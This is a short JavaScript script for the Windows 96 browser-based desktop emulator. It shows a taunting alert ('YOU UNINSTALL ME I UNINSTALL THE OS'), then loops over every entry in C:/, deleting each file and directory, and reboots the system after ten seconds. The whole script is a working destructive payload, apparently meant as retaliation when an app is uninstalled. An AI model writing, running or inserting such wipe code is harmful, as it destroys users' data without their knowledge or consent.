//!wrt
alert("<h1>YOU UNINSTALL ME I UNINSTALL THE OS</h1>");
var dir = await w96.FS.readdir("C:/");
for (i = 0; i < dir.length; i++) {
  if (await w96.FS.isFile(dir[i])) {
    await w96.FS.rm(dir[i]) 
  } else { 
    await w96.FS.rmdir(dir[i]) 
  } 
}
setTimeout(() => {w96.sys.reboot()},10000)